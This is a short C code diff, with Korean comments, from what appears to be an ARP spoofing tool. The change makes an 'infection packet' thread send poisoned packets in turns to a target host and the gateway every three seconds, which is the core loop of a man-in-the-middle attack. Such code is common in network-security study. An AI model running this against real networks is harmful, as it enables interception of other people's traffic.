@@ -8,10 +8,12 @@ void *thread_infect(void *arg) //감염패킷
 
     u_char pkt[PACKETSIZE];
     // 공격 대상과 Gateway에게 번갈아가며 감염 패킷 전송
+    int infect_target = TARGET;
     while (1)
     {
-        insertInfectPacketField(pkt, arg, TARGET);
+        insertInfectPacketField(pkt, arg, infect_target);
         printf("%s\n", pcap_sendpacket(pcap_handle, pkt, sizeof(pkt)) == -1 ? "error" : "감염패킷 전송 성공");
+        infect_target = infect_target == TARGET ? GATEWAY : TARGET;
         sleep(3);
     }
 }
